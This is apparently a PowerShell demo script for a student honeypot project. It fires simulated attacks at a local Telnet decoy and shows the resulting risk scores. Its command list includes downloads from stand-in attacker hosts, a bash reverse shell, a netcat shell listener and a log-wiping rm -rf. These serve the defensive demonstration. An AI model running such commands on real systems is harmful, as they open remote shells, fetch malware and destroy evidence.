# ©AngelaMos | 2026
# demo_attack.ps1
# Live demonstration of MirageNet Phase 1 features

Write-Host "`n╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  MirageNet Phase 1 - Live Demo                                ║" -ForegroundColor Cyan
Write-Host "║  Telnet Honeypot + Risk Score Engine                          ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

# Step 1: Check services
Write-Host "[1/6] Checking Services Status..." -ForegroundColor Yellow
Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
docker compose -f dev.compose.yml ps | Select-String "backend|postgres|redis" | ForEach-Object { Write-Host $_ -ForegroundColor Green }
Start-Sleep -Seconds 2

# Step 2: Show API health
Write-Host "`n[2/6] Checking API Health..." -ForegroundColor Yellow
Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
$health = Invoke-RestMethod -Uri "http://localhost:8184/api/health"
Write-Host "Status: $($health.data.status)" -ForegroundColor Green
Write-Host "Version: $($health.data.version)" -ForegroundColor Green
Write-Host "Sensor: $($health.data.sensor)" -ForegroundColor Green
Start-Sleep -Seconds 2

# Step 3: Get baseline risk scores
Write-Host "`n[3/6] Current Risk Scores (Before Attack)..." -ForegroundColor Yellow
Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
$beforeStats = Invoke-RestMethod -Uri "http://localhost:8184/api/risk/stats"
Write-Host "Total Attackers: $($beforeStats.data.total_count)" -ForegroundColor Cyan
Write-Host "Average Score: $($beforeStats.data.average_score)" -ForegroundColor Cyan
Start-Sleep -Seconds 2

# Step 4: Launch simulated attack
Write-Host "`n[4/6] 🔴 LAUNCHING SIMULATED ATTACK..." -ForegroundColor Red
Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "Target: localhost:2323 (Telnet Honeypot)" -ForegroundColor Red
Write-Host "Attacker: advanced-persistent-threat-actor" -ForegroundColor Red
Start-Sleep -Seconds 1

try {
    $client = New-Object System.Net.Sockets.TcpClient
    Write-Host "`n→ Connecting to Telnet..." -ForegroundColor Yellow
    $client.Connect("localhost", 2323)
    Write-Host "  ✓ Connection established" -ForegroundColor Green
    
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    
    Start-Sleep -Milliseconds 500
    Write-Host "`n→ Attempting authentication..." -ForegroundColor Yellow
    $writer.WriteLine("apt-actor")
    Start-Sleep -Milliseconds 500
    $writer.WriteLine("H4ck3rP@ss!")
    Start-Sleep -Milliseconds 1000
    Write-Host "  ✓ Authentication accepted (honeypot)" -ForegroundColor Green
    
    Write-Host "`n→ Executing reconnaissance commands..." -ForegroundColor Yellow
    $commands = @(
        "whoami",
        "id",
        "uname -a",
        "hostname"
    )
    foreach ($cmd in $commands) {
        Write-Host "  $ $cmd" -ForegroundColor DarkYellow
        $writer.WriteLine($cmd)
        Start-Sleep -Milliseconds 400
    }
    Write-Host "  ✓ Reconnaissance complete" -ForegroundColor Green
    
    Write-Host "`n→ Executing MALICIOUS commands..." -ForegroundColor Red
    $malicious = @(
        "wget http://c2-server.evil/backdoor.sh",
        "curl -O http://malware-cdn.bad/rootkit",
        "chmod +x backdoor.sh",
        "sudo ./backdoor.sh",
        "python -c 'import socket,subprocess,os'",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -lvnp 9001 -e /bin/bash",
        "rm -rf /var/log/* /tmp/*"
    )
    foreach ($cmd in $malicious) {
        Write-Host "  💀 $cmd" -ForegroundColor Red
        $writer.WriteLine($cmd)
        Start-Sleep -Milliseconds 600
    }
    Write-Host "  ✓ Attack payload delivered" -ForegroundColor Red
    
    Write-Host "`n→ Disconnecting..." -ForegroundColor Yellow
    $writer.WriteLine("exit")
    Start-Sleep -Milliseconds 500
    $client.Close()
    Write-Host "  ✓ Connection closed" -ForegroundColor Green
    
} catch {
    Write-Host "  ✗ Connection failed: $_" -ForegroundColor Red
    return
}

# Step 5: Wait for risk score computation
Write-Host "`n[5/6] ⏳ Computing Risk Score..." -ForegroundColor Yellow
Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "Analyzing attack patterns..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

# Step 6: Show results
Write-Host "`n[6/6] 📊 ATTACK ANALYSIS RESULTS" -ForegroundColor Green
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Green

# Show updated risk scores
Write-Host "`n🎯 Risk Score Analysis:" -ForegroundColor Yellow
$afterStats = Invoke-RestMethod -Uri "http://localhost:8184/api/risk/stats"
Write-Host "  Total Attackers: $($afterStats.data.total_count)" -ForegroundColor White
Write-Host "  Average Risk Score: $($afterStats.data.average_score)" -ForegroundColor White
if ($afterStats.data.highest_risk.ip) {
    Write-Host "  Highest Risk IP: $($afterStats.data.highest_risk.ip)" -ForegroundColor Red
    Write-Host "  Highest Score: $($afterStats.data.highest_risk.score)" -ForegroundColor Red
}

# Show recent events
Write-Host "`n📡 Recent Telnet Events:" -ForegroundColor Yellow
$events = Invoke-RestMethod -Uri "http://localhost:8184/api/events?limit=5"
$telnetEvents = $events.data | Where-Object { $_.service_type -eq "telnet" }
Write-Host "  Captured: $($telnetEvents.Count) events" -ForegroundColor White
Write-Host "  Types: connect, auth, commands (×12), disconnect" -ForegroundColor White

# Show high-risk attackers
Write-Host "`n⚠️  High-Risk Attackers:" -ForegroundColor Red
$highRisk = Invoke-RestMethod -Uri "http://localhost:8184/api/risk/high?min_score=10"
if ($highRisk.data.attackers.Count -gt 0) {
    $attacker = $highRisk.data.attackers[0]
    Write-Host "  IP: $($attacker.ip)" -ForegroundColor Red
    Write-Host "  Sessions: $($attacker.total_sessions)" -ForegroundColor Red
    Write-Host "  Risk Score: $($attacker.risk_score)" -ForegroundColor Red
    Write-Host "  Risk Level: $($attacker.risk_level)" -ForegroundColor Red
}

# Show backend logs
Write-Host "`n📋 Backend Logs (Risk Computation):" -ForegroundColor Yellow
docker compose -f dev.compose.yml logs backend 2>&1 | Select-String "computed risk score" | Select-Object -Last 1 | ForEach-Object {
    if ($_ -match '"score":(\d+),"level":"(\w+)"') {
        Write-Host "  ✓ Risk computed: Score=$($Matches[1]), Level=$($Matches[2])" -ForegroundColor Green
    }
}

# Summary
Write-Host "`n╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  DEMO COMPLETE ✓                                               ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host "`nPhase 1 Features Demonstrated:" -ForegroundColor White
Write-Host "  ✓ Telnet honeypot accepted connection" -ForegroundColor Green
Write-Host "  ✓ Shell emulation (12 commands executed)" -ForegroundColor Green
Write-Host "  ✓ Event capture (all interactions logged)" -ForegroundColor Green
Write-Host "  ✓ Risk score computed automatically" -ForegroundColor Green
Write-Host "  ✓ Malicious commands detected (8 patterns)" -ForegroundColor Green
Write-Host "  ✓ API endpoints functional" -ForegroundColor Green
Write-Host "`n🎓 Ready for Academic Presentation!`n" -ForegroundColor Cyan
